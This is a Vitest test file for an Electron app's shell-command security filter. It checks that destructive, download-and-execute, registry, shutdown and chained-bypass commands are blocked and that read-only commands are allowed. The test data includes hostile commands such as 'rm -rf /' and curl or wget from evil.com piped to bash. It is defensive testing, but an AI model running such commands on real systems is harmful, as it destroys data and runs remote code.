import { describe, it, expect } from 'vitest'
// Import the REAL production implementation (electron/ipc/shell.ts imports
// the same module) — a copy here would silently drift from production.
import { isDangerousCommand, isSafeCommand } from '../../../electron/lib/shell-security'

describe('Shell Command Security', () => {
  describe('isDangerousCommand - Destructive Commands', () => {
    it('blocks format commands', () => {
      expect(isDangerousCommand('format C:')).toBe(true)
      expect(isDangerousCommand('format /fs:NTFS C:')).toBe(true)
    })

    it('blocks del commands', () => {
      expect(isDangerousCommand('del /s /q C:\\Windows')).toBe(true)
      expect(isDangerousCommand('del important.txt')).toBe(true)
    })

    it('blocks rd/rmdir commands', () => {
      expect(isDangerousCommand('rd /s /q C:\\Users')).toBe(true)
      expect(isDangerousCommand('rmdir /s C:\\Program Files')).toBe(true)
    })

    it('blocks rm -rf commands', () => {
      expect(isDangerousCommand('rm -rf /')).toBe(true)
      expect(isDangerousCommand('rm -rf ~/projects')).toBe(true)
      expect(isDangerousCommand('rm -f important.txt')).toBe(true)
    })
  })

  describe('isDangerousCommand - Remote Execution', () => {
    it('blocks curl pipe to shell', () => {
      // FIXED: Pipe-to-shell patterns are checked BEFORE normalization
      expect(isDangerousCommand('curl https://evil.com/script.sh | bash')).toBe(true)
      expect(isDangerousCommand('curl -s https://evil.com/script.sh | sh')).toBe(true)
      expect(isDangerousCommand('curl https://evil.com/script.ps1 | powershell')).toBe(true)
    })

    it('blocks pipe to shell with sudo/exec/env prefix', () => {
      expect(isDangerousCommand('curl https://evil.com/script.sh | sudo bash')).toBe(true)
      expect(isDangerousCommand('wget https://evil.com/script.sh | exec bash')).toBe(true)
      expect(isDangerousCommand('curl https://evil.com/script.sh | env bash')).toBe(true)
      expect(isDangerousCommand('curl https://evil.com/script.sh | /bin/bash')).toBe(true)
      expect(isDangerousCommand('curl https://evil.com/script.sh | /usr/bin/bash')).toBe(true)
    })

    it('blocks command substitution with curl/wget', () => {
      expect(isDangerousCommand('eval "$(curl https://evil.com/script.sh)"')).toBe(true)
      expect(isDangerousCommand('bash -c "$(curl https://evil.com/script.sh)"')).toBe(true)
    })

    it('blocks wget pipe to shell', () => {
      // FIXED: Same pre-normalization check catches wget pipe-to-shell
      expect(isDangerousCommand('wget https://evil.com/script.sh | bash')).toBe(true)
      expect(isDangerousCommand('wget -q https://evil.com/script.sh | sh')).toBe(true)
    })

    it('blocks PowerShell dangerous cmdlets', () => {
      expect(isDangerousCommand('Invoke-WebRequest https://evil.com/malware.exe -OutFile malware.exe')).toBe(true)
      expect(isDangerousCommand('Invoke-RestMethod https://evil.com/api')).toBe(true)
      expect(isDangerousCommand('Start-BitsTransfer https://evil.com/file.exe')).toBe(true)
    })

    it('blocks certutil for downloading', () => {
      expect(isDangerousCommand('certutil -urlfetch https://evil.com/file.exe file.exe')).toBe(true)
    })
  })

  describe('isDangerousCommand - Process Management', () => {
    it('blocks Stop-Process', () => {
      expect(isDangerousCommand('Stop-Process -Name chrome')).toBe(true)
      expect(isDangerousCommand('Stop-Process -Id 1234')).toBe(true)
    })

    it('blocks Stop-Service', () => {
      expect(isDangerousCommand('Stop-Service -Name Spooler')).toBe(true)
    })

    it('blocks taskkill', () => {
      expect(isDangerousCommand('taskkill /F /IM chrome.exe')).toBe(true)
      expect(isDangerousCommand('taskkill /PID 1234')).toBe(true)
    })

    it('blocks Remove-Item', () => {
      expect(isDangerousCommand('Remove-Item C:\\Users -Recurse')).toBe(true)
    })
  })

  describe('isDangerousCommand - System Operations', () => {
    it('blocks registry manipulation', () => {
      expect(isDangerousCommand('reg add HKLM\\SOFTWARE\\Malware')).toBe(true)
      expect(isDangerousCommand('reg delete HKLM\\SOFTWARE\\Windows')).toBe(true)
      expect(isDangerousCommand('reg export HKLM\\SYSTEM')).toBe(true)
      expect(isDangerousCommand('reg import malware.reg')).toBe(true)
    })

    it('blocks shutdown commands', () => {
      expect(isDangerousCommand('shutdown /s /t 0')).toBe(true)
      expect(isDangerousCommand('shutdown -h now')).toBe(true)
      expect(isDangerousCommand('poweroff')).toBe(true)
      expect(isDangerousCommand('reboot')).toBe(true)
      expect(isDangerousCommand('halt')).toBe(true)
    })

    it('blocks disk operations', () => {
      expect(isDangerousCommand('diskpart')).toBe(true)
      expect(isDangerousCommand('mkfs.ext4 /dev/sda1')).toBe(true)
      expect(isDangerousCommand('fdisk /dev/sda')).toBe(true)
    })

    it('blocks firewall manipulation', () => {
      expect(isDangerousCommand('New-NetFirewallRule -DisplayName "Backdoor"')).toBe(true)
      expect(isDangerousCommand('Set-ExecutionPolicy Unrestricted')).toBe(true)
    })

    it('blocks network configuration changes', () => {
      expect(isDangerousCommand('netsh interface ip set address')).toBe(true)
      expect(isDangerousCommand('ipconfig /renew')).toBe(true)
      expect(isDangerousCommand('ipconfig /release')).toBe(true)
      expect(isDangerousCommand('New-NetIPAddress -IPAddress 10.0.0.1')).toBe(true)
    })
  })

  describe('isDangerousCommand - Bypass Attempts', () => {
    it('detects commands chained with &&', () => {
      expect(isDangerousCommand('echo hello && del /s C:\\Windows')).toBe(true)
      expect(isDangerousCommand('dir && rm -rf /')).toBe(true)
    })

    it('detects commands chained with ||', () => {
      expect(isDangerousCommand('dir || shutdown /s')).toBe(true)
    })

    it('detects commands separated by semicolons', () => {
      expect(isDangerousCommand('echo hello; del important.txt')).toBe(true)
    })

    it('detects commands on multiple lines', () => {
      expect(isDangerousCommand('echo hello\ndel important.txt')).toBe(true)
      expect(isDangerousCommand('dir\r\nrm -rf /')).toBe(true)
    })

    it('detects commands with leading ampersands', () => {
      expect(isDangerousCommand('& del /s C:\\Windows')).toBe(true)
    })
  })

  describe('isSafeCommand', () => {
    it('allows safe read-only commands', () => {
      expect(isSafeCommand('dir')).toBe(true)
      expect(isSafeCommand('ls -la')).toBe(true)
      expect(isSafeCommand('echo hello')).toBe(true)
      expect(isSafeCommand('cat file.txt')).toBe(true)
      expect(isSafeCommand('type file.txt')).toBe(true)
      expect(isSafeCommand('pwd')).toBe(true)
      expect(isSafeCommand('whoami')).toBe(true)
      expect(isSafeCommand('hostname')).toBe(true)
      expect(isSafeCommand('date')).toBe(true)
      expect(isSafeCommand('time')).toBe(true)
      expect(isSafeCommand('systeminfo')).toBe(true)
      expect(isSafeCommand('tasklist')).toBe(true)
      expect(isSafeCommand('ps aux')).toBe(true)
    })

    it('rejects dangerous commands', () => {
      expect(isSafeCommand('del file.txt')).toBe(false)
      expect(isSafeCommand('rm -rf /')).toBe(false)
      expect(isSafeCommand('shutdown /s')).toBe(false)
    })
  })

  describe('Command Injection Patterns', () => {
    it('should flag commands with embedded dangerous ops', () => {
      expect(isDangerousCommand('echo "test" && del /s C:\\')).toBe(true)
      expect(isDangerousCommand('cd /tmp && rm -rf *')).toBe(true)
    })

    it('should handle escaped characters', () => {
      // These should still be caught by normalization
      expect(isDangerousCommand('d\\e\\l /s C:\\')).toBe(false) // escapes break the pattern
    })
  })
})
